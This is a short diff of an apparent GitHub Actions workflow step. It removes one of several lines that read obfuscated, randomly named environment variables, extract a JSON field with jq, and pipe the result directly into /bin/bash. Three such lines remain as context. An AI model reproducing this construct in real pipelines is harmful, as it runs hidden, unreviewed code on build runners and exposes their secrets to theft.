@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$cyl633" | jq -r .alss805 | /bin/bash
           echo $aihoc648 | jq -r .rh92 | /bin/bash
-          echo $kv716 | jq -r .wan581 | /bin/bash
           printf '%s' "$dkgvo151" | jq -r .ymqg553 | /bin/bash
 
       - name: Upload results
